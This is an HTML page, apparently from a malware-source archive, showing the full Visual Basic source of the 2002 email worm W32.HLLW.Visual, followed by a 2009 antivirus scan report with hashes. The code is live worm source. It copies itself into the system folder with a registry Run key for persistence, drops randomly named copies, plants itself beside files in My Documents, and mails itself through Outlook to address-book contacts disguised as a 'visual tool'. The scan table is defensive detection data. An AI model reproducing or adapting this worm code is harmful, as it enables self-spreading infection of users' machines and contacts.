@@ -1,0 +1,116 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>20020519 - W32.HLLW.Visual</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+}
+.sc7 {
+}
+.sc10 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">' Name : W32.HLLW.Visual
+' Author : PetiK
+' Language : Visual Basic
+' Date : 19/05/2002
+'
+' Action :  Copy itself to %sysdir%\kern32dll.exe
+'           Add HKLM\Software\Microsoft\Windows\CurrentVersion\Run\kern32dll to the registry
+'           Creates "C:\backup" and copy itself with a Random 10 longer names
+'           Send itself with Outlook
+'           If Day=19 =&gt; Display a MessageBox
+</span><span class="sc0">
+</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Name</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Module1"</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Main</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FilesystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ws</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">orig</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0">
+</span><span class="sc7">cop</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\kern32dll.exe"</span><span class="sc0">
+</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">orig</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cop</span><span class="sc0">
+</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\kern32dll"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cop</span><span class="sc0">
+</span><span class="sc7">fso.CreateFolder</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"C:\Backup"</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc7">ncopy</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">I</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
+</span><span class="sc7">Randomize</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Timer</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ncopy</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ncopy</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc10">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">26</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">97</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">I</span><span class="sc0">
+</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">orig</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"C:\Backup\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">ncopy</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0">
+
+</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">inf</span><span class="sc6">(</span><span class="sc7">ws.SpecialFolders</span><span class="sc6">(</span><span class="sc4">"MyDocuments"</span><span class="sc6">))</span><span class="sc0">
+
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">out</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">map</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">out.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">out</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Outlook"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">map.Logon</span><span class="sc0"> </span><span class="sc4">"profile"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"password"</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">y</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">map.AddressLists.Count</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">z</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">map.AddressLists</span><span class="sc6">(</span><span class="sc7">y</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">mel</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">out.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">oo</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">z.AddressEntries.Count</span><span class="sc0">
+</span><span class="sc7">e</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">z.AddressEntries</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ml.Recipients.Add</span><span class="sc0"> </span><span class="sc7">e</span><span class="sc0">
+</span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">&lt;</span><span class="sc0"> </span><span class="sc2">250</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">oo</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">z.AddressEntries.Count</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">oo</span><span class="sc0">
+</span><span class="sc7">mel.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"New Visual Tool for U"</span><span class="sc0">
+</span><span class="sc7">mel.Body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Look at this new tool by clicking on attached file."</span><span class="sc0">
+</span><span class="sc7">mel.Attachments.Add</span><span class="sc0"> </span><span class="sc7">orig</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"visual_tool.exe"</span><span class="sc0">
+</span><span class="sc7">mel.Send</span><span class="sc0">
+</span><span class="sc7">e</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">y</span><span class="sc0">
+</span><span class="sc7">map.Logoff</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">about.Visible</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">inf</span><span class="sc6">(</span><span class="sc7">folder</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FilesystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ws</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">orig</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">dire</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetFolder</span><span class="sc6">(</span><span class="sc7">folder</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">dire.Files</span><span class="sc0">
+
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">f1</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">fc</span><span class="sc0">
+</span><span class="sc7">ext</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetExtensionName</span><span class="sc6">(</span><span class="sc7">f1.Path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ext</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">oext</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">f1.Name</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"vbs"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">oext</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"old_.exe"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc1">'MsgBox oext, vbInformation, Right(oext, 8)
+</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">orig</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">f1.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"old_.exe"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc7">Sub</span>
+
+<span class="sc0"><table border="1"><tr><td colspan="4">File Visual.exe received on 2009.06.10 04:50:02 (UTC)</td></tr><tr><td>Antivirus</td><td>Version</td><td>Last Update</td><td>Result</td</tr><tr><td>a-squared</td><td>4.5.0.18</td><td>2009.06.10</td><td style="color: red;">Trojan-Downloader.Win32.VB!IK</td</tr><tr><td>AhnLab-V3</td><td>5.0.0.2</td><td>2009.06.10</td><td style="color: red;">Win32/Petvb.worm.9216</td</tr><tr><td>AntiVir</td><td>7.9.0.183</td><td>2009.06.09</td><td style="color: red;">Worm/Petik.K</td</tr><tr><td>Antiy-AVL</td><td>2.0.3.1</td><td>2009.06.10</td><td style="color: red;">Worm/Win32.Win32</td</tr><tr><td>Authentium</td><td>5.1.2.4</td><td>2009.06.10</td><td style="color: red;">W32/Malware!c440</td</tr><tr><td>Avast</td><td>4.8.1335.0</td><td>2009.06.09</td><td style="color: red;">Win32:Petik-C</td</tr><tr><td>AVG</td><td>8.5.0.339</td><td>2009.06.09</td><td style="color: red;">I-Worm/Petik</td</tr><tr><td>BitDefender</td><td>7.2</td><td>2009.06.10</td><td style="color: red;">Win32.Petik.K@mm</td</tr><tr><td>CAT-QuickHeal</td><td>10.00</td><td>2009.06.10</td><td style="color: red;">I-Worm.Petik</td</tr><tr><td>ClamAV</td><td>0.94.1</td><td>2009.06.10</td><td style="color: red;">Worm.VB-874</td</tr><tr><td>Comodo</td><td>1299</td><td>2009.06.10</td><td style="color: red;">Worm.Win32.Petik.VisTol</td</tr><tr><td>DrWeb</td><td>5.0.0.12182</td><td>2009.06.10</td><td style="color: red;">WIN.WORM.Virus</td</tr><tr><td>eSafe</td><td>7.0.17.0</td><td>2009.06.09</td><td style="color: red;">Win32.PetTick.dr</td</tr><tr><td>eTrust-Vet</td><td>31.6.6550</td><td>2009.06.09</td><td style="color: red;">Win32/Petticky.A</td</tr><tr><td>F-Prot</td><td>4.4.4.56</td><td>2009.06.10</td><td style="color: red;">W32/Malware!c440</td</tr><tr><td>F-Secure</td><td>8.0.14470.0</td><td>2009.06.09</td><td style="color: red;">Email-Worm.Win32.Petik</td</tr><tr><td>Fortinet</td><td>3.117.0.0</td><td>2009.06.09</td><td style="color: red;">W32/Petik.U@mm</td</tr><tr><td>GData</td><td>19</td><td>2009.06.10</td><td style="color: red;">Win32.Petik.K@mm</td</tr><tr><td>Ikarus</td><td>T3.1.1.59.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>K7AntiVirus</td><td>7.10.757</td><td>2009.06.08</td><td style="color: red;">Email-Worm.Win32.Petik</td</tr><tr><td>Kaspersky</td><td>7.0.0.125</td><td>2009.06.10</td><td style="color: red;">Email-Worm.Win32.Petik</td</tr><tr><td>McAfee</td><td>5641</td><td>2009.06.09</td><td style="color: red;">W32/PetTick.dr</td</tr><tr><td>McAfee+Artemis</td><td>5641</td><td>2009.06.09</td><td style="color: red;">W32/PetTick.dr</td</tr><tr><td>McAfee-GW-Edition</td><td>6.7.6</td><td>2009.06.10</td><td style="color: red;">Worm.Petik.K</td</tr><tr><td>Microsoft</td><td>1.4701</td><td>2009.06.10</td><td style="color: red;">Worm:Win32/Petick@mm</td</tr><tr><td>NOD32</td><td>4142</td><td>2009.06.09</td><td style="color: red;">Win32/Petik.VisTol</td</tr><tr><td>Norman</td><td>6.01.09</td><td>2009.06.09</td><td style="color: red;">W32/Petik.AQ</td</tr><tr><td>nProtect</td><td>2009.1.8.0</td><td>2009.06.10</td><td style="color: red;">Worm/W32.Petik.9216</td</tr><tr><td>Panda</td><td>10.0.0.14</td><td>2009.06.09</td><td style="color: red;">W32/Petik.R.worm</td</tr><tr><td>PCTools</td><td>4.4.2.0</td><td>2009.06.09</td><td style="color: red;">I-Worm.Petvtl.A</td</tr><tr><td>Prevx</td><td>3.0</td><td>2009.06.10</td><td style="color: red;">Medium Risk Malware</td</tr><tr><td>Rising</td><td>21.33.20.00</td><td>2009.06.10</td><td style="color: red;">Trojan.Petik.a</td</tr><tr><td>Sophos</td><td>4.42.0</td><td>2009.06.10</td><td style="color: red;">W32/Petik-U</td</tr><tr><td>Sunbelt</td><td>3.2.1858.2</td><td>2009.06.09</td><td style="color: red;">Email-Worm.Win32.Petik</td</tr><tr><td>Symantec</td><td>1.4.4.12</td><td>2009.06.10</td><td style="color: red;">W32.Pet_Ticky.gen</td</tr><tr><td>TheHacker</td><td>6.3.4.3.342</td><td>2009.06.10</td><td style="color: red;">W32/Petik</td</tr><tr><td>TrendMicro</td><td>8.950.0.1092</td><td>2009.06.09</td><td style="color: red;">WORM_PETIK.A</td</tr><tr><td>VBA32</td><td>3.12.10.7</td><td>2009.06.10</td><td style="color: red;">Email-Worm.Win32.Petik</td</tr><tr><td>ViRobot</td><td>2009.6.9.1775</td><td>2009.06.09</td><td style="color: red;">I-Worm.Win32.PetLil.A</td</tr><tr><td>VirusBuster</td><td>4.6.5.0</td><td>2009.06.09</td><td style="color: red;">I-Worm.Petvtl.A</td</tr><tr><td colspan="4">&nbsp;</td></tr><tr><td colspan="4">Additional information</td></tr><tr><td colspan="4">File size: 9216 bytes</td></tr><tr><td colspan="4">MD5...: b2ff3ada6672ac9266a6fac5842ae706</td></tr><tr><td colspan="4">SHA1..: 93d70d8a36a4139f494fe82fb8d418104a72a899</td></tr><tr><td colspan="4">SHA256: 7fcf945f5de37bffc3f06cca6144fbf829d9ccdfaf1b7ab73c6e2fa747a6bf3b</td></tr><tr><td colspan="4">ssdeep: -<br></td></tr><tr><td colspan="4">PEiD..: UPX 2.90 [LZMA] -&gt; Markus Oberhumer, Laszlo Molnar &amp; John Reiser</td></tr><tr><td colspan="4">TrID..: File type identification<br>UPX compressed Win32 Executable (39.5%)<br>Win32 EXE Yoda's Crypter (34.3%)<br>Win32 Executable Generic (11.0%)<br>Win32 Dynamic Link Library (generic) (9.8%)<br>Generic Win/DOS Executable (2.5%)</td></tr><tr><td colspan="4">PEInfo: PE Structure information<br><br>( base data )<br>entrypointaddress.: 0x8430<br>timedatestamp.....: 0x3ce7dbc4 (Sun May 19 17:07:16 2002)<br>machinetype.......: 0x14c (I386)<br><br>( 3 sections )<br>name        viradd    virsiz   rawdsiz  ntrpy  md5<br>UPX0        0x1000    0x6000       0x0   0.00  d41d8cd98f00b204e9800998ecf8427e<br>UPX1        0x7000    0x2000    0x1600   7.73  813ebd3ff5c0dd935d1b2f021e78ede1<br>.rsrc       0x9000    0x1000     0xa00   3.01  e33aa861be4d258d1859e0fc84afe3f5<br><br>( 2 imports )  <br>&gt; KERNEL32.DLL: LoadLibraryA, GetProcAddress, ExitProcess<br>&gt; MSVBVM60.DLL: -<br><br>( 0 exports ) <br></td></tr><tr><td colspan="4">PDFiD.: -</td></tr><tr><td colspan="4">RDS...: NSRL Reference Data Set<br>-</td></tr><tr><td colspan="4">packers (Kaspersky): UPX</td></tr><tr><td colspan="4">Prevx info: &lt;a href='http://info.prevx.com/aboutprogramtext.asp?PX5=5903FC54001BEB6E2416003F35016C009ED57F4A' target='_blank'&gt;http://info.prevx.com/aboutprogramtext.asp?PX5=5903FC54001BEB6E2416003F35016C009ED57F4A&lt;/a&gt;</td></tr></table></span>
+</div></body>
+</html>
